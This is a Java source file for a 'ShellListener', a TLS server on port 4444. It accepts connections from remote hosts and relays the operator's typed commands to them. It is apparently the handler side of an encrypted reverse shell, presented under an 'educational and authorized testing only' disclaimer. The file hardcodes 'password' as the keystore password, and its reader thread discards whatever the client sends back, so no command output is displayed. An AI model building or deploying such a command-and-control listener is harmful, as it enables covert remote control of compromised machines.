/*
This code is provided for educational and authorized security testing purposes ONLY.

By using this code, you agree that:
1. You have explicit permission to test the target system.
2. The author takes NO responsibility for misuse, damages, or legal consequences.
3. Unauthorized use on systems you do not own or have permission for is ILLEGAL.

*/

package NetworkShell;
import javax.net.ssl.*;
import java.io.*;
import java.security.KeyStore;

public class ShellListener {

    public static void main(String[] args) throws Exception {
        int port = 4444;

        String osName = System.getProperty("os.name").toLowerCase();
        boolean isWindows = osName.contains("win");

        KeyStore keyStore = KeyStore.getInstance("JKS");
        try (FileInputStream fis = new FileInputStream("/NetworkShell/shellkeystore.jks")) {
            keyStore.load(fis, "password".toCharArray());
        }

        KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
        kmf.init(keyStore, "password".toCharArray());

        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(kmf.getKeyManagers(), null, null);

        SSLServerSocketFactory ssf = sslContext.getServerSocketFactory();
        SSLServerSocket server = (SSLServerSocket) ssf.createServerSocket(port);

        System.out.println("Listening for TLS connections on port " + port);

        while (true) {
            SSLSocket client = (SSLSocket) server.accept();
            System.out.println("Connection received from " + client.getInetAddress());

            new Thread(() -> handleClient(client, isWindows)).start();
        }
    }

    private static void handleClient(SSLSocket client, boolean isWindows) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
             BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(client.getOutputStream()));
             BufferedReader console = new BufferedReader(new InputStreamReader(System.in))) {

            new Thread(() -> {
                try {
                    String line;
                    while ((line = reader.readLine()) != null) {}
                } catch (IOException e) {
                    System.err.println("Client disconnected");
                }
            }).start();

            String cmd;
            while ((cmd = console.readLine()) != null) {
                writer.write(cmd + (isWindows ? "\r\n" : "\n"));
                writer.flush();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

